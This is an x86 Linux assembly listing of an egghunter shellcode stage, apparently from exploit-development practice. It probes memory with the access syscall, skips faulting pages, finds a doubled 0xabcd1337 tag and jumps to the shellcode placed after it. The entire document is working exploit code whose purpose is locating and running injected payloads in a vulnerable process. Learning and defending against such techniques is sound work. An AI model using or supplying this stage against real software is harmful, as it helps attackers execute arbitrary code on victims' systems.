global _start
_start:
    xor eax, eax            ;clear all registers
    mov ecx, eax
    mov edx, eax
    
    mov esi, 0xabcd1337     ;define the egg to search for


incToNextPage:
    or dx, 0xfff            ;increase dx by 0xfff

incToNextByte:
    inc edx                 ;increase one byte / in combination with 0xfff we increase by 0x1000
    
                            ;read memory with access function
    lea ebx,  [edx+8]       ;load ebx register with a pointer to the memory we want to check
    xor eax, eax            ;reset eax for next instruction
    mov al, 0x21            ;access function 0x21
    int 0x80

    cmp al, 0xf2            
    je incToNextPage        ;jmp if al = 0xf2 (fault) and continue with the next memory address

    cmp [edx], esi          ;if no fault check for egg
    jnz incToNextByte       ;if not the 1st egg then check next memory address

    cmp [edx+4], esi        ;check the 2nd egg
    jnz incToNextByte       ;if not the 2nd egg then check next memory address

    lea edx, [edx+8]        ;load the addresscode after the egg
    jmp edx                 ;jump / execute the shellcode